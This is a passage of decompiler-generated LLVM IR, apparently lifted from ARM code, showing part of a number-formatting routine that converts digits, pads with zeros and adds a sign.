  %v1_179dc = add i32 %v0_179dc, 1
  store i32 %v1_179dc, i32* %r1.global-to-local, align 4
  %v0_179e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_179e0, label %bb208, label %dec_label_pc_17a10

bb208:                                            ; preds = %bb207
  %v0_179e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_179e4 = load i32, i32* %ip.global-to-local, align 4
  %not.v7_179e8 = icmp sge i32 %v1_179e4, %v0_179e4
  %. = zext i1 %not.v7_179e8 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_179f0 = add i32 %v0_179e4, 4
  %v4_179f0 = sub i32 0, %v0_179e4
  %v5_179f0 = and i32 %v2_179f0, %v4_179f0
  %v6_179f0 = icmp slt i32 %v5_179f0, 0
  store i1 %v6_179f0, i1* %cpsr_v.global-to-local, align 1
  %v7_179f0 = icmp slt i32 %v2_179f0, 0
  store i1 %v7_179f0, i1* %cpsr_n.global-to-local, align 1
  %v8_179f0 = icmp eq i32 %v2_179f0, 0
  store i1 %v8_179f0, i1* %cpsr_z.global-to-local, align 1
  %v5_179f4 = icmp slt i32 %v0_179e4, -4
  br i1 %v5_179f4, label %.thread24, label %bb209

.thread24:                                        ; preds = %bb208
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb209:                                            ; preds = %bb208
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_179f8 = icmp eq i1 %not.v7_179e8, false
  store i1 %v2_179f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_179f8, label %.thread, label %bb210

.thread:                                          ; preds = %.thread24, %bb209
  %v1_179fc29 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_179fc29, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17a1c

bb210:                                            ; preds = %bb209
  %v3_17a00 = sub i32 %v1_179e4, %v0_179e4
  store i32 %v3_17a00, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17a28

dec_label_pc_17a10:                               ; preds = %bb207
  %v0_17a10 = load i32, i32* %r7.global-to-local, align 4
  %v1_17a10 = add i32 %v0_17a10, -102
  %v3_17a10 = sub i32 101, %v0_17a10
  %v4_17a10 = and i32 %v3_17a10, %v0_17a10
  %v5_17a10 = icmp slt i32 %v4_17a10, 0
  store i1 %v5_17a10, i1* %cpsr_v.global-to-local, align 1
  %v6_17a10 = icmp slt i32 %v1_17a10, 0
  store i1 %v6_17a10, i1* %cpsr_n.global-to-local, align 1
  %v7_17a10 = icmp eq i32 %v0_17a10, 102
  store i1 %v7_17a10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_17a10, i32* %sl.global-to-local, align 4
  br i1 %v7_17a10, label %dec_label_pc_17a10.dec_label_pc_17a28_crit_edge, label %dec_label_pc_17a1c

dec_label_pc_17a10.dec_label_pc_17a28_crit_edge:  ; preds = %dec_label_pc_17a10
  %v0_17a28.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17a28

dec_label_pc_17a1c:                               ; preds = %.thread, %dec_label_pc_17a10
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17a38

dec_label_pc_17a28:                               ; preds = %bb210, %dec_label_pc_17a10.dec_label_pc_17a28_crit_edge
  %v0_17a28 = phi i32 [ %v0_17a28.pre, %dec_label_pc_17a10.dec_label_pc_17a28_crit_edge ], [ %v0_179e4, %bb210 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17a28 = icmp slt i32 %v0_17a28, 0
  store i1 %v1_17a28, i1* %cpsr_n.global-to-local, align 1
  %v2_17a28 = icmp eq i32 %v0_17a28, 0
  store i1 %v2_17a28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_17a28, label %bb211, label %bb212

bb211:                                            ; preds = %dec_label_pc_17a28
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_17a30 = load i32, i32* %r2.global-to-local, align 4
  %v6_17a30 = add i32 %v5_17a30, -1
  %v7_17a30 = inttoptr i32 %v6_17a30 to i8*
  store i8 48, i8* %v7_17a30, align 1
  %v8_17a30 = load i32, i32* %r2.global-to-local, align 4
  %v9_17a30 = add i32 %v8_17a30, -1
  store i32 %v9_17a30, i32* %r2.global-to-local, align 4
  %v0_17a34.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_17a64.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_17a68.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17a68.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_17a28, %bb211
  %v1_17a68.pre = phi i1 [ %v1_17a68.pre.pre, %bb211 ], [ false, %dec_label_pc_17a28 ]
  %v0_17a68.pre = phi i1 [ %v0_17a68.pre.pre, %bb211 ], [ false, %dec_label_pc_17a28 ]
  %v1_17a64.pre = phi i32 [ %v1_17a64.pre.pre, %bb211 ], [ %v1_179dc, %dec_label_pc_17a28 ]
  %v0_17a34 = phi i32 [ %v0_17a34.pre, %bb211 ], [ %v0_17a28, %dec_label_pc_17a28 ]
  store i32 %v0_17a34, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17a38

dec_label_pc_17a38:                               ; preds = %dec_label_pc_17a1c, %bb212
  %v0_17b08 = phi i32 [ 0, %dec_label_pc_17a1c ], [ %v0_17a34, %bb212 ]
  %v1_17a6c = phi i1 [ false, %dec_label_pc_17a1c ], [ %v1_17a68.pre, %bb212 ]
  %v0_17a6c = phi i1 [ false, %dec_label_pc_17a1c ], [ %v0_17a68.pre, %bb212 ]
  %v1_17a64 = phi i32 [ %v1_179dc, %dec_label_pc_17a1c ], [ %v1_17a64.pre, %bb212 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_17a44 = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_17a44, i32* %r3.global-to-local, align 4
  %v0_17a50 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a50 = inttoptr i32 %v0_17a50 to i8*
  %v2_17a50 = load i8, i8* %v1_17a50, align 1
  %v3_17a50 = zext i8 %v2_17a50 to i32
  store i32 %v3_17a50, i32* %r3.global-to-local, align 4
  %v5_17a50 = add i32 %v0_17a50, 1
  store i32 %v5_17a50, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_17a50, i32* %stack_var_-46, align 4
  %v2_17a64 = sub i32 %v1_17a64, %v5_17a50
  store i32 %v2_17a64, i32* %r1.global-to-local, align 4
  %v2_17a68 = xor i1 %v1_17a6c, %v0_17a6c
  br i1 %v2_17a68, label %.thread127, label %dec_label_pc_17a70

.thread127:                                       ; preds = %dec_label_pc_17a38
  %v5_17a68 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_17a68, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17b18

dec_label_pc_17a70:                               ; preds = %dec_label_pc_17a38
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_17a74 = sub i32 %v0_17b08, %v2_17a64
  %v4_17a74 = xor i32 %v2_17a64, %v0_17b08
  %v5_17a74 = xor i32 %v2_17a74, %v0_17b08
  %v6_17a74 = and i32 %v5_17a74, %v4_17a74
  %v7_17a74 = icmp slt i32 %v6_17a74, 0
  store i1 %v7_17a74, i1* %cpsr_v.global-to-local, align 1
  %v8_17a74 = icmp slt i32 %v2_17a74, 0
  store i1 %v8_17a74, i1* %cpsr_n.global-to-local, align 1
  %v9_17a74 = icmp eq i32 %v0_17b08, %v2_17a64
  store i1 %v9_17a74, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_17a80 = xor i1 %v8_17a74, %v7_17a74
  br i1 %v2_17a80, label %bb214, label %dec_label_pc_17a84

dec_label_pc_17a84:                               ; preds = %dec_label_pc_17a70
  store i32 %v2_17a74, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_17a74, i1* %cpsr_n.global-to-local, align 1
  %v2_17a88 = icmp eq i32 %v2_17a74, 0
  store i1 %v2_17a88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_176e8, i32* %lr.global-to-local, align 4
  %tmp213 = icmp slt i32 %v2_17a74, 1
  br i1 %tmp213, label %.thread129, label %dec_label_pc_17a9c

.thread129:                                       ; preds = %dec_label_pc_17a84
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17b14

dec_label_pc_17a9c:                               ; preds = %dec_label_pc_17a84
  store i32 ptrtoint (i32* @global_var_1dbb3.1094 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_17aa8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_17aa8, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_17b18

bb214:                                            ; preds = %dec_label_pc_17a70
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17af4 = icmp slt i32 %v0_17b08, 0
  store i1 %v1_17af4, i1* %cpsr_n.global-to-local, align 1
  %v2_17af4 = icmp eq i32 %v0_17b08, 0
  store i1 %v2_17af4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_176e8, i32* %lr.global-to-local, align 4
  %tmp215 = icmp slt i32 %v0_17b08, 1
  br i1 %tmp215, label %dec_label_pc_17b14, label %dec_label_pc_17b04

dec_label_pc_17b04:                               ; preds = %bb214
  %v2_17b08 = sub i32 %v2_17a64, %v0_17b08
  store i32 %v2_17b08, i32* %r1.global-to-local, align 4
  %v2_17b0c = add i32 %v5_17a50, %v0_17b08
  store i32 %v2_17b0c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17b14

dec_label_pc_17b14:                               ; preds = %dec_label_pc_17b04, %.thread129, %bb214
  %storemerge141.in = phi i32* [ %stack_var_-160, %bb214 ], [ %stack_var_-148, %.thread129 ], [ %stack_var_-148, %dec_label_pc_17b04 ]
  %v0_17b2882 = phi i32 [ %v2_17a64, %bb214 ], [ 0, %.thread129 ], [ %v2_17b08, %dec_label_pc_17b04 ]
  %storemerge141 = ptrtoint i32* %storemerge141.in to i32
  store i32 %storemerge141, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17b18

dec_label_pc_17b18:                               ; preds = %.thread127, %dec_label_pc_17a9c, %dec_label_pc_17b14
  %v1_17b48 = phi i32 [ %v2_17aa8, %dec_label_pc_17a9c ], [ %storemerge141, %dec_label_pc_17b14 ], [ %v5_17a68, %.thread127 ]
  %v0_17b6090 = phi i32 [ -1, %dec_label_pc_17a9c ], [ -1, %dec_label_pc_17b14 ], [ %v0_17b08, %.thread127 ]
  %v0_17b28 = phi i32 [ 0, %dec_label_pc_17a9c ], [ %v0_17b2882, %dec_label_pc_17b14 ], [ %v2_17a64, %.thread127 ]
  %v0_17b18 = load i32, i32* %fp.global-to-local, align 4
  %v1_17b18 = add i32 %v0_17b18, 12
  %v2_17b18 = inttoptr i32 %v1_17b18 to i32*
  %v3_17b18 = load i32, i32* %v2_17b18, align 4
  %v1_17b1c = and i32 %v3_17b18, 16
  store i32 %v1_17b1c, i32* %lr.global-to-local, align 4
  %v2_17b1c = icmp eq i32 %v1_17b1c, 0
  %tmp238 = zext i1 %v2_17b1c to i32
  %.230 = xor i32 %tmp238, 1
  store i32 %.230, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17b28 = icmp slt i32 %v0_17b28, 0
  store i1 %v1_17b28, i1* %cpsr_n.global-to-local, align 1
  %v2_17b28 = icmp eq i32 %v0_17b28, 0
  store i1 %v2_17b28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b28, label %bb218, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_17b18
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17b44

bb218:                                            ; preds = %dec_label_pc_17b18
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_17b1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b1c, label %dec_label_pc_17b38, label %dec_label_pc_17b44

dec_label_pc_17b38:                               ; preds = %bb218
  %v0_17b38 = load i32, i32* %r7.global-to-local, align 4
  %v1_17b38 = add i32 %v0_17b38, -103
  %v3_17b38 = sub i32 102, %v0_17b38
  %v4_17b38 = and i32 %v3_17b38, %v0_17b38
  %v5_17b38 = icmp slt i32 %v4_17b38, 0
  store i1 %v5_17b38, i1* %cpsr_v.global-to-local, align 1
  %v6_17b38 = icmp slt i32 %v1_17b38, 0
  store i1 %v6_17b38, i1* %cpsr_n.global-to-local, align 1
  %v7_17b38 = icmp eq i32 %v0_17b38, 103
  store i1 %v7_17b38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17b38, label %dec_label_pc_17b60, label %bb219

bb219:                                            ; preds = %dec_label_pc_17b38
  %v1_17b3c = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_17b3c = icmp slt i32 %v1_17b3c, 0
  store i1 %v2_17b3c, i1* %cpsr_n.global-to-local, align 1
  %v3_17b3c = icmp eq i32 %v1_17b3c, 0
  store i1 %v3_17b3c, i1* %cpsr_z.global-to-local, align 1
  %tmp220 = icmp slt i32 %v1_17b3c, 1
  br i1 %tmp220, label %dec_label_pc_17b60, label %dec_label_pc_17b44

dec_label_pc_17b44:                               ; preds = %.thread33, %bb218, %bb219
  %v2_17b48 = inttoptr i32 %v1_17b48 to i32*
  store i32 112, i32* %v2_17b48, align 4
  %v1_17b50 = load i32, i32* %r6.global-to-local, align 4
  %v2_17b50 = add i32 %v1_17b50, 4
  %v3_17b50 = inttoptr i32 %v2_17b50 to i32*
  store i32 1, i32* %v3_17b50, align 4
  store i32 ptrtoint (i32* @global_var_1dbc0.1096 to i32), i32* %r3.global-to-local, align 4
  %v1_17b58 = load i32, i32* %r6.global-to-local, align 4
  %v2_17b58 = add i32 %v1_17b58, 8
  %v3_17b58 = inttoptr i32 %v2_17b58 to i32*
  store i32 ptrtoint (i32* @global_var_1dbc0.1096 to i32), i32* %v3_17b58, align 4
  %v0_17b5c = load i32, i32* %r6.global-to-local, align 4
  %v1_17b5c = add i32 %v0_17b5c, 12
  store i32 %v1_17b5c, i32* %r6.global-to-local, align 4
  %v0_17b60.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17b60

dec_label_pc_17b60:                               ; preds = %dec_label_pc_17b38, %bb219, %dec_label_pc_17b44
  %v1_17b6c = phi i32 [ %v1_17b48, %bb219 ], [ %v1_17b5c, %dec_label_pc_17b44 ], [ %v1_17b48, %dec_label_pc_17b38 ]
  %v0_17b60 = phi i32 [ %v0_17b6090, %bb219 ], [ %v0_17b60.pre, %dec_label_pc_17b44 ], [ %v0_17b6090, %dec_label_pc_17b38 ]
  %v1_17b60 = add i32 %v0_17b60, 1
  store i32 %v1_17b60, i32* %ip.global-to-local, align 4
  %v3_17b60 = sub i32 0, %v0_17b60
  %v4_17b60 = and i32 %v1_17b60, %v3_17b60
  %v5_17b60 = icmp slt i32 %v4_17b60, 0
  store i1 %v5_17b60, i1* %cpsr_v.global-to-local, align 1
  %v6_17b60 = icmp slt i32 %v1_17b60, 0
  store i1 %v6_17b60, i1* %cpsr_n.global-to-local, align 1
  %v7_17b60 = icmp eq i32 %v1_17b60, 0
  store i1 %v7_17b60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17b60, label %dec_label_pc_17b84, label %dec_label_pc_17b68

dec_label_pc_17b68:                               ; preds = %dec_label_pc_17b60
  %v1_17b68 = sub i32 -1, %v0_17b60
  %v2_17b6c = add i32 %v1_17b6c, 4
  %v3_17b6c = inttoptr i32 %v2_17b6c to i32*
  store i32 %v1_17b68, i32* %v3_17b6c, align 4
  store i32 ptrtoint (i32* @global_var_1dbb3.1094 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_17b78 = load i32, i32* %r6.global-to-local, align 4
  %v2_17b78 = inttoptr i32 %v1_17b78 to i32*
  store i32 176, i32* %v2_17b78, align 4
  %v0_17b7c = load i32, i32* %r3.global-to-local, align 4
  %v1_17b7c = load i32, i32* %r6.global-to-local, align 4
  %v2_17b7c = add i32 %v1_17b7c, 8
  %v3_17b7c = inttoptr i32 %v2_17b7c to i32*
  store i32 %v0_17b7c, i32* %v3_17b7c, align 4
  %v0_17b80 = load i32, i32* %r6.global-to-local, align 4
  %v1_17b80 = add i32 %v0_17b80, 12
  store i32 %v1_17b80, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17b84

dec_label_pc_17b84:                               ; preds = %dec_label_pc_17b60, %dec_label_pc_17b68
  %v2_17b8c = phi i32 [ %v1_17b6c, %dec_label_pc_17b60 ], [ %v1_17b80, %dec_label_pc_17b68 ]
  %v0_17b84 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17b84 = icmp slt i32 %v0_17b84, 0
  store i1 %v1_17b84, i1* %cpsr_n.global-to-local, align 1
  %v2_17b84 = icmp eq i32 %v0_17b84, 0
  store i1 %v2_17b84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b84, label %.thread42, label %bb221

bb221:                                            ; preds = %dec_label_pc_17b84
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_17b8c = inttoptr i32 %v2_17b8c to i32*
  store i32 112, i32* %v3_17b8c, align 4
  %v1_17b90 = load i32, i32* %r4.global-to-local, align 4
  %v2_17b90 = load i32, i32* %r6.global-to-local, align 4
  %v3_17b90 = add i32 %v2_17b90, 8
  %v4_17b90 = inttoptr i32 %v3_17b90 to i32*
  store i32 %v1_17b90, i32* %v4_17b90, align 4
  %v1_17b94 = load i32, i32* %r1.global-to-local, align 4
  %v2_17b94 = load i32, i32* %r6.global-to-local, align 4
  %v3_17b94 = add i32 %v2_17b94, 4
  %v4_17b94 = inttoptr i32 %v3_17b94 to i32*
  store i32 %v1_17b94, i32* %v4_17b94, align 4
  %v1_17b98 = load i32, i32* %r6.global-to-local, align 4
  %v2_17b98 = add i32 %v1_17b98, 12
  store i32 %v2_17b98, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_17b84, %bb221
  %v1_17bbc = phi i32 [ %v2_17b8c, %dec_label_pc_17b84 ], [ %v2_17b98, %bb221 ]
  %v0_17b9c = load i32, i32* %r7.global-to-local, align 4
  %v1_17b9c = add i32 %v0_17b9c, -103
  %v3_17b9c = sub i32 102, %v0_17b9c
  %v4_17b9c = and i32 %v3_17b9c, %v0_17b9c
  %v5_17b9c = icmp slt i32 %v4_17b9c, 0
  store i1 %v5_17b9c, i1* %cpsr_v.global-to-local, align 1
  %v6_17b9c = icmp slt i32 %v1_17b9c, 0
  store i1 %v6_17b9c, i1* %cpsr_n.global-to-local, align 1
  %v7_17b9c = icmp eq i32 %v0_17b9c, 103
  store i1 %v7_17b9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17b9c, label %dec_label_pc_17ba4, label %dec_label_pc_17bac

dec_label_pc_17ba4:                               ; preds = %.thread42
  %v0_17ba4 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17ba4 = icmp slt i32 %v0_17ba4, 0
  store i1 %v1_17ba4, i1* %cpsr_n.global-to-local, align 1
  %v2_17ba4 = icmp eq i32 %v0_17ba4, 0
  store i1 %v2_17ba4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17ba4, label %dec_label_pc_17bd4, label %dec_label_pc_17bac

dec_label_pc_17bac:                               ; preds = %.thread42, %dec_label_pc_17ba4
  %v0_17bac = load i32, i32* %ip.global-to-local, align 4
  %v1_17bac = load i32, i32* %r1.global-to-local, align 4
  %v2_17bac = sub i32 %v1_17bac, %v0_17bac
  store i32 %v2_17bac, i32* %r3.global-to-local, align 4
  %v1_17bb0 = load i32, i32* %r8.global-to-local, align 4
  %v2_17bb0 = sub i32 %v2_17bac, %v1_17bb0
  %v4_17bb0 = xor i32 %v1_17bb0, %v2_17bac
  %v5_17bb0 = xor i32 %v2_17bb0, %v2_17bac
  %v6_17bb0 = and i32 %v5_17bb0, %v4_17bb0
  %v7_17bb0 = icmp slt i32 %v6_17bb0, 0
  store i1 %v7_17bb0, i1* %cpsr_v.global-to-local, align 1
  %v8_17bb0 = icmp slt i32 %v2_17bb0, 0
  store i1 %v8_17bb0, i1* %cpsr_n.global-to-local, align 1
  %v9_17bb0 = icmp eq i32 %v2_17bac, %v1_17bb0
  store i1 %v9_17bb0, i1* %cpsr_z.global-to-local, align 1
  %v2_17bb4 = xor i1 %v8_17bb0, %v7_17bb0
  br i1 %v2_17bb4, label %dec_label_pc_17bb8, label %dec_label_pc_17bd4

dec_label_pc_17bb8:                               ; preds = %dec_label_pc_17bac
  %v2_17bb8 = sub i32 %v1_17bb0, %v2_17bac
  %v2_17bbc = add i32 %v1_17bbc, 4
  %v3_17bbc = inttoptr i32 %v2_17bbc to i32*
  store i32 %v2_17bb8, i32* %v3_17bbc, align 4
  store i32 ptrtoint (i32* @global_var_1dbb3.1094 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_17bc8 = load i32, i32* %r6.global-to-local, align 4
  %v2_17bc8 = inttoptr i32 %v1_17bc8 to i32*
  store i32 176, i32* %v2_17bc8, align 4
  %v0_17bcc = load i32, i32* %r3.global-to-local, align 4
  %v1_17bcc = load i32, i32* %r6.global-to-local, align 4
  %v2_17bcc = add i32 %v1_17bcc, 8
  %v3_17bcc = inttoptr i32 %v2_17bcc to i32*
  store i32 %v0_17bcc, i32* %v3_17bcc, align 4
  %v0_17bd0 = load i32, i32* %r6.global-to-local, align 4
  %v1_17bd0 = add i32 %v0_17bd0, 12
  store i32 %v1_17bd0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17bd4

dec_label_pc_17bd4:                               ; preds = %dec_label_pc_17bac, %dec_label_pc_17ba4, %dec_label_pc_17bb8
  %v1_17c68.pre.pre = phi i32 [ %v1_17bbc, %dec_label_pc_17bac ], [ %v1_17bbc, %dec_label_pc_17ba4 ], [ %v1_17bd0, %dec_label_pc_17bb8 ]
  %v0_17bd4 = load i32, i32* %sl.global-to-local, align 4
  %v1_17bd4 = add i32 %v0_17bd4, -102
  %v3_17bd4 = sub i32 101, %v0_17bd4
  %v4_17bd4 = and i32 %v3_17bd4, %v0_17bd4
  %v5_17bd4 = icmp slt i32 %v4_17bd4, 0
  store i1 %v5_17bd4, i1* %cpsr_v.global-to-local, align 1
  %v6_17bd4 = icmp slt i32 %v1_17bd4, 0
  store i1 %v6_17bd4, i1* %cpsr_n.global-to-local, align 1
  %v7_17bd4 = icmp eq i32 %v0_17bd4, 102
  store i1 %v7_17bd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17bd4, label %dec_label_pc_17c5c, label %dec_label_pc_17bdc

dec_label_pc_17bdc:                               ; preds = %dec_label_pc_17bd4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17be0 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17be0 = icmp slt i32 %v0_17be0, 0
  store i1 %v1_17be0, i1* %cpsr_n.global-to-local, align 1
  %v2_17be0 = icmp eq i32 %v0_17be0, 0
  store i1 %v2_17be0, i1* %cpsr_z.global-to-local, align 1
  %v4_17be4 = zext i8 %stack_var_-66.0108114 to i32
  store i32 %v4_17be4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_17bf4 = sub i32 0, %v0_17be0
  %storemerge140 = select i1 %v1_17be0, i32 %v4_17bf4, i32 %v0_17be0
  %tmp239 = ashr i32 %v0_17be0, 31
  %tmp240 = and i32 %tmp239, 2
  %tmp241 = add nuw nsw i32 %tmp240, 43
  store i32 %storemerge140, i32* %r4.global-to-local, align 4
  store i32 %tmp241, i32* %sl.global-to-local, align 4
  %v2_17bfc = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_17bfc, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17c04

dec_label_pc_17c04:                               ; preds = %dec_label_pc_17c34, %dec_label_pc_17c04, %dec_label_pc_17bdc
  %v2_17c1c = phi i32 [ %v2_17bfc, %dec_label_pc_17bdc ], [ %v6_17c1c, %dec_label_pc_17c04 ], [ %v6_17c1c, %dec_label_pc_17c34 ]
  %v0_17c18 = phi i32 [ %storemerge140, %dec_label_pc_17bdc ], [ %v2_17c20, %dec_label_pc_17c04 ], [ %v2_17c20, %dec_label_pc_17c34 ]
  %v2_17c0c = srem i32 %v0_17c18, 10
  %v1_17c10 = add nsw i32 %v2_17c0c, 48
  store i32 %v1_17c10, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_17c18, i32* %r0.global-to-local, align 4
  %v1_17c1c = trunc i32 %v1_17c10 to i8
  %v3_17c1c = add i32 %v2_17c1c, -1
  %v4_17c1c = inttoptr i32 %v3_17c1c to i8*
  store i8 %v1_17c1c, i8* %v4_17c1c, align 1
  %v5_17c1c = load i32, i32* %r5.global-to-local, align 4
  %v6_17c1c = add i32 %v5_17c1c, -1
  store i32 %v6_17c1c, i32* %r5.global-to-local, align 4
  %v0_17c20 = load i32, i32* %r0.global-to-local, align 4
  %v1_17c20 = load i32, i32* %r1.global-to-local, align 4
  %v2_17c20 = sdiv i32 %v0_17c20, %v1_17c20
  store i32 %v2_17c20, i32* %r0.global-to-local, align 4
  %v0_17c24 = load i32, i32* %r7.global-to-local, align 4
  %v1_17c24 = add i32 %v0_17c24, 1
  store i32 %v1_17c24, i32* %r7.global-to-local, align 4
  %v1_17c28 = add i32 %v0_17c24, -2
  %v3_17c28 = sub i32 1, %v0_17c24
  %v4_17c28 = and i32 %v3_17c28, %v1_17c24
  %v5_17c28 = icmp slt i32 %v4_17c28, 0
  store i1 %v5_17c28, i1* %cpsr_v.global-to-local, align 1
  %v6_17c28 = icmp slt i32 %v1_17c28, 0
  store i1 %v6_17c28, i1* %cpsr_n.global-to-local, align 1
  %v7_17c28 = icmp eq i32 %v1_17c24, 3
  store i1 %v7_17c28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_17c20, i32* %r4.global-to-local, align 4
  %v7_17c30 = icmp slt i32 %v1_17c24, 4
  br i1 %v7_17c30, label %dec_label_pc_17c04, label %dec_label_pc_17c34

dec_label_pc_17c34:                               ; preds = %dec_label_pc_17c04
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17c34 = icmp slt i32 %v2_17c20, 0
  store i1 %v1_17c34, i1* %cpsr_n.global-to-local, align 1
  %v2_17c34 = icmp eq i32 %v2_17c20, 0
  store i1 %v2_17c34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17c34, label %dec_label_pc_17c3c, label %dec_label_pc_17c04

dec_label_pc_17c3c:                               ; preds = %dec_label_pc_17c34
  %v1_17c3c = add i32 %v5_17c1c, -2
  store i32 %v1_17c3c, i32* %r3.global-to-local, align 4
  %v0_17c40 = load i32, i32* %sl.global-to-local, align 4
  %v1_17c40 = trunc i32 %v0_17c40 to i8
  %v4_17c40 = inttoptr i32 %v1_17c3c to i8*
  store i8 %v1_17c40, i8* %v4_17c40, align 1
  %v0_17c44 = load i32, i32* %r3.global-to-local, align 4
  %v1_17c44 = add i32 %v0_17c44, -1
  store i32 %v1_17c44, i32* %r2.global-to-local, align 4
  %v0_17c48 = load i32, i32* %r8.global-to-local, align 4
  %v1_17c48 = trunc i32 %v0_17c48 to i8
  %v4_17c48 = inttoptr i32 %v1_17c44 to i8*
  store i8 %v1_17c48, i8* %v4_17c48, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_17c50 = load i32, i32* %r6.global-to-local, align 4
  %v1_17c50 = inttoptr i32 %v0_17c50 to i32*
  store i32 112, i32* %v1_17c50, align 4
  %v3_17c50 = add i32 %v0_17c50, 4
  %v4_17c50 = inttoptr i32 %v3_17c50 to i32*
  %v5_17c50 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_17c50, i32* %v4_17c50, align 4
  %v0_17c54 = load i32, i32* %r2.global-to-local, align 4
  %v1_17c54 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c54 = add i32 %v1_17c54, 8
  %v3_17c54 = inttoptr i32 %v2_17c54 to i32*
  store i32 %v0_17c54, i32* %v3_17c54, align 4
  %v0_17c58 = load i32, i32* %r6.global-to-local, align 4
  %v1_17c58 = add i32 %v0_17c58, 12
  store i32 %v1_17c58, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17c5c

dec_label_pc_17c5c:                               ; preds = %dec_label_pc_17bd4, %.thread105, %dec_label_pc_17c3c
